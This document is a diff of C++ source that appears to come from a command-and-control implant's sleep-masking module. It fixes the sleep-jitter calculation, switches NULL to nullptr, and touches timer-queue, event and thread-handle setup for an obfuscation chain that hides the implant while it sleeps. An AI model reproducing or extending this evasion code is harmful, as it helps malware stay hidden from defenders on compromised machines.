@@ -13,12 +13,11 @@ auto DECLFN Mask::Main(
     ULONG RndTime = 0;
     
     if ( Self->Config.Jitter ) {
-        ULONG JitterMnt = ( Self->Config.Jitter * Self->Config.SleepTime ) / 100; 
-        ULONG SleepMin  = ( Self->Config.SleepTime > JitterMnt ? Self->Config.SleepTime - JitterMnt : 0 ); 
-        ULONG SleepMax  = ( Self->Config.SleepTime + JitterMnt );
-        ULONG Range     = ( SleepMax - SleepMin + 1 );
-        
-        RndTime = ( Rnd32() % Range );
+        ULONG JitterMnt = ( Self->Config.Jitter * Self->Config.SleepTime ) / 100;
+        ULONG SleepMin = ( Self->Config.SleepTime > JitterMnt ? Self->Config.SleepTime - JitterMnt : 0 );
+        ULONG SleepMax = ( Self->Config.SleepTime + JitterMnt );
+        ULONG Range = ( SleepMax - SleepMin + 1 );
+        RndTime = SleepMin + ( Rnd32() % Range );  
     } else {
         RndTime = Self->Config.SleepTime;
     }
@@ -43,16 +42,16 @@ auto DECLFN Mask::Timer(
     NTSTATUS NtStatus = STATUS_SUCCESS;
     
     ULONG  DupThreadId      = Self->Td->Rnd();
-    HANDLE DupThreadHandle  = NULL;
-    HANDLE MainThreadHandle = NULL;
+    HANDLE DupThreadHandle  = nullptr;
+    HANDLE MainThreadHandle = nullptr;
 
-    HANDLE Queue       = NULL;
-    HANDLE Timer       = NULL;
-    HANDLE EventTimer  = NULL;
-    HANDLE EventStart  = NULL;
-    HANDLE EventEnd    = NULL;
+    HANDLE Queue       = nullptr;
+    HANDLE Timer       = nullptr;
+    HANDLE EventTimer  = nullptr;
+    HANDLE EventStart  = nullptr;
+    HANDLE EventEnd    = nullptr;
 
-    PVOID OldProtection = NULL;
+    PVOID OldProtection = nullptr;
     ULONG DelayTimer    = 0;
     BOOL  bSuccess      = FALSE;
 
@@ -72,9 +71,9 @@ auto DECLFN Mask::Timer(
 
     NtStatus = Self->Krnl32.DuplicateHandle( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &MainThreadHandle, THREAD_ALL_ACCESS, FALSE, 0 );
 
-    NtStatus = Self->Ntdll.NtCreateEvent( &EventTimer,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
-    NtStatus = Self->Ntdll.NtCreateEvent( &EventStart,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
-    NtStatus = Self->Ntdll.NtCreateEvent( &EventEnd,    EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
+    NtStatus = Self->Ntdll.NtCreateEvent( &EventTimer,  EVENT_ALL_ACCESS, nullptr, NotificationEvent, FALSE );
+    NtStatus = Self->Ntdll.NtCreateEvent( &EventStart,  EVENT_ALL_ACCESS, nullptr, NotificationEvent, FALSE );
+    NtStatus = Self->Ntdll.NtCreateEvent( &EventEnd,    EVENT_ALL_ACCESS, nullptr, NotificationEvent, FALSE );
 
     NtStatus = Self->Ntdll.RtlCreateTimerQueue( &Queue );
     if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;
@@ -174,7 +173,7 @@ auto DECLFN Mask::Timer(
 
     KhDbg( "trigger obf chain" );
 
-    NtStatus = Self->Ntdll.NtSignalAndWaitForSingleObject( EventStart, EventEnd, FALSE, NULL );
+    NtStatus = Self->Ntdll.NtSignalAndWaitForSingleObject( EventStart, EventEnd, FALSE, nullptr );
     if ( NtStatus != STATUS_SUCCESS ) goto _KH_END;
 
     if ( Self->Config.Mask.Heap ) {
